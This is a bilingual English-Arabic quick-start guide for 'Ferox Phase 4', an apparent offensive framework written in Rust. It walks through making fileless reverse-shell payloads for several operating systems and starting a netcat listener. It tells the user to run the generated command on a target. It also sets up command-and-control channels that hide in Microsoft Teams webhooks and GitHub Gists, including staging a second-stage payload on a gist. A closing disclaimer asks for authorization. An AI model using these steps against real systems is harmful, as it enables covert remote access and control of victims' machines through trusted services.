# 🚀 Ferox Phase 4 - Quick Start Guide
# دليل البدء السريع

---

## ⚡ 5-Minute Setup | الإعداد في 5 دقائق

### 1️⃣ Prerequisites | المتطلبات الأساسية

```bash
# Install Rust (if not already installed)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# Verify installation
rustc --version
cargo --version
```

### 2️⃣ Clone & Build | الاستنساخ والبناء

```bash
# Navigate to project directory
cd ferox_phase4

# Run verification
./verify.sh

# Build the project
./build.sh

# Or manually:
cargo build --release
```

### 3️⃣ First Payload | أول حمولة

```bash
# Generate a Windows reverse TCP payload
./target/release/ferox payload \
  -H 192.168.1.100 \
  -P 4444 \
  -O windows \
  --output my_first_payload.txt

# View the output
cat my_first_payload.txt
```

---

## 🎯 Common Use Cases | حالات الاستخدام الشائعة

### Use Case 1: Basic Reverse Shell
#### حالة 1: الصدفة العكسية الأساسية

```bash
# Step 1: Start a listener
nc -lvnp 4444

# Step 2: Generate payload
ferox payload -H YOUR_IP -P 4444 -O windows

# Step 3: Copy the execution command from output
# Step 4: Run on target system
```

### Use Case 2: Multi-Platform Payloads
#### حالة 2: حمولات متعددة المنصات

```bash
# Windows
ferox payload -H 192.168.1.100 -P 4444 -O windows -o windows.txt

# Linux
ferox payload -H 192.168.1.100 -P 4445 -O linux -o linux.txt

# macOS
ferox payload -H 192.168.1.100 -P 4446 -O macos -o macos.txt

# Universal (Python)
ferox payload -H 192.168.1.100 -P 4447 -O universal -o universal.txt
```

### Use Case 3: With C2 Channel
#### حالة 3: مع قناة C2

```bash
# Set up environment
export TEAMS_WEBHOOK_URL="https://outlook.office.com/webhook/..."
export GITHUB_TOKEN="ghp_..."

# Generate with C2
ferox payload \
  -H 192.168.1.100 \
  -P 4444 \
  -O windows \
  --c2 https://gist.githubusercontent.com/user/id/raw/stage2 \
  --output c2_payload.txt
```

---

## 📖 CLI Commands | أوامر واجهة سطر الأوامر

### List Modules | عرض الوحدات

```bash
# List all modules
ferox list

# List only payloads
ferox list --type-filter payload

# List only C2 modules
ferox list --type-filter c2
```

### Module Information | معلومات الوحدة

```bash
# Show module details
ferox info payloads/fileless/reverse_tcp
ferox info c2/teams_tunnel
ferox info c2/github_gist
```

### Generate Payloads | توليد الحمولات

```bash
# Basic syntax
ferox payload -H <HOST> -P <PORT> -O <OS> [OPTIONS]

# Options:
#   -H, --lhost <IP>        Target IP address
#   -P, --lport <PORT>      Target port (default: 4444)
#   -O, --os <OS>           Target OS (windows|linux|macos|universal)
#   -c, --c2 <URL>          C2 channel URL (optional)
#   -o, --output <FILE>     Output file (optional)

# Examples:
ferox payload -H 192.168.1.100 -P 4444 -O windows
ferox payload -H 10.0.0.5 -P 443 -O linux --c2 https://c2.example.com
ferox payload -H 172.16.0.10 -P 8080 -O macos -o payload.txt
```

### Statistics | الإحصائيات

```bash
# Show module statistics
ferox stats
```

---

## 💻 Programmatic Usage | الاستخدام البرمجي

### Example 1: Simple Payload Generation
#### مثال 1: توليد حمولة بسيطة

```rust
use ferox_phase4::core::payload_engine::{PayloadEngine, TargetOS};
use ferox_phase4::modules::payloads::rev_tcp_fileless::{
    FilelessReverseTcp, ReverseTcpConfig
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Create module
    let module = FilelessReverseTcp::new()?;
    
    // Configure
    let config = ReverseTcpConfig {
        lhost: "192.168.1.100".to_string(),
        lport: 4444,
        target_os: TargetOS::Windows,
        encrypt: true,
        c2_channel: None,
    };
    
    // Generate
    let result = module.execute(config)?;
    
    // Display
    result.display();
    
    Ok(())
}
```

### Example 2: Teams C2 Integration
#### مثال 2: تكامل Teams C2

```rust
use ferox_phase4::modules::c2::teams_tunnel::{
    TeamsTunnel, CommandBuilder, CommandType
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let webhook = "https://outlook.office.com/webhook/YOUR_WEBHOOK";
    let key = b"your_32_byte_encryption_key_here";
    
    let tunnel = TeamsTunnel::new(webhook, key)?;
    
    // Send message
    tunnel.send_message("Test", "Hello from Ferox!").await?;
    
    Ok(())
}
```

### Example 3: GitHub Gist C2
#### مثال 3: GitHub Gist C2

```rust
use ferox_phase4::modules::c2::github_gist_loader::GistC2Builder;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut loader = GistC2Builder::new()
        .api_token("ghp_YOUR_TOKEN")
        .encryption_key(b"your_key_32_bytes_long_exactly!!")
        .build()?;
    
    // Create gist
    let gist = loader.create_gist(
        "My Payload",
        "payload.txt",
        "payload_content",
        false
    ).await?;
    
    println!("Gist created: {}", gist.html_url);
    
    Ok(())
}
```

---

## 🔐 Environment Variables | متغيرات البيئة

```bash
# Microsoft Teams webhook URL
export TEAMS_WEBHOOK_URL="https://outlook.office.com/webhook/..."

# GitHub personal access token
export GITHUB_TOKEN="ghp_..."

# Enable debug logging
export RUST_LOG=debug

# Custom encryption key (optional)
export FEROX_MASTER_KEY="your_secure_master_key_here"
```

---

## 🧪 Testing | الاختبار

```bash
# Run all tests
cargo test

# Run with output
cargo test -- --nocapture

# Run specific test
cargo test test_engine_creation

# Run integration example
cargo run --example full_integration
```

---

## 📊 Directory Structure | هيكل المجلدات

```
ferox_phase4/
├── Cargo.toml                  # Dependencies
├── README.md                   # Main documentation
├── QUICK_START.md             # This file
├── USAGE_GUIDE.md             # Advanced guide
├── PROJECT_SUMMARY.md         # Complete summary
├── build.sh                   # Build script
├── verify.sh                  # Verification script
│
├── src/
│   ├── lib.rs                 # Library exports
│   ├── main.rs                # CLI interface
│   ├── core/
│   │   └── payload_engine.rs  # Core engine
│   └── modules/
│       ├── mod.rs             # Module registry
│       ├── payloads/
│       │   └── rev_tcp_fileless.rs
│       └── c2/
│           ├── teams_tunnel.rs
│           └── github_gist_loader.rs
│
└── examples/
    └── full_integration.rs    # Complete example
```

---

## ⚠️ Important Reminders | تذكيرات مهمة

### Legal Requirements | المتطلبات القانونية

```
✅ ALWAYS:
  - Get written authorization
  - Test only on systems you own
  - Follow all applicable laws
  - Document your activities
  - Report findings responsibly

❌ NEVER:
  - Use without authorization
  - Deploy on production systems
  - Cause harm or disruption
  - Access private data
  - Violate terms of service
```

### Security Best Practices | أفضل ممارسات الأمان

```
1. Rotate encryption keys regularly
2. Use strong, random keys (32 bytes)
3. Test in isolated environments
4. Clean up after testing
5. Secure your infrastructure
6. Monitor your activities
7. Keep logs for auditing
```

---

## 🆘 Troubleshooting | استكشاف الأخطاء

### Common Issues | المشاكل الشائعة

#### Build Errors | أخطاء البناء

```bash
# Update Rust
rustup update

# Clean and rebuild
cargo clean
cargo build --release
```

#### Missing Dependencies | التبعيات المفقودة

```bash
# Install OpenSSL development packages
# Ubuntu/Debian:
sudo apt install libssl-dev pkg-config

# macOS:
brew install openssl pkg-config
```

#### Permission Errors | أخطاء الصلاحيات

```bash
# Make scripts executable
chmod +x build.sh verify.sh

# Fix ownership
chown -R $USER:$USER .
```

---

## 📚 Next Steps | الخطوات التالية

1. **Read the full documentation**
   - README.md for overview
   - USAGE_GUIDE.md for advanced usage
   - PROJECT_SUMMARY.md for complete details

2. **Run the examples**
   ```bash
   cargo run --example full_integration
   ```

3. **Experiment safely**
   - Use VMs for testing
   - Isolate test networks
   - Practice in labs

4. **Customize for your needs**
   - Create custom modules
   - Add new C2 channels
   - Extend functionality

5. **Stay updated**
   - Check for new releases
   - Read security advisories
   - Join the community

---

## 📞 Get Help | الحصول على المساعدة

- **Documentation:** https://docs.ferox.dev
- **GitHub Issues:** https://github.com/ferox-security/ferox/issues
- **Email:** security@ferox.dev
- **Discord:** https://discord.gg/ferox

---

## ✅ Verification Checklist | قائمة التحقق

Before starting, ensure:
- [ ] Rust toolchain installed (1.70+)
- [ ] All files verified (./verify.sh)
- [ ] Project builds successfully (./build.sh)
- [ ] Tests pass (cargo test)
- [ ] Authorization obtained for testing
- [ ] Test environment prepared
- [ ] Documentation reviewed
- [ ] Environment variables configured

---

**🎉 You're Ready to Go! | أنت جاهز للبدء!**

```bash
# Start with this command:
./target/release/ferox --help

# Or:
ferox list
```

**Happy (ethical) hacking! | قرصنة سعيدة (أخلاقية)!**

---

**Made with ❤️ by Abdulwahed & Ferox Security Team**

**Version:** 4.0.0  
**Status:** Production Ready ✅
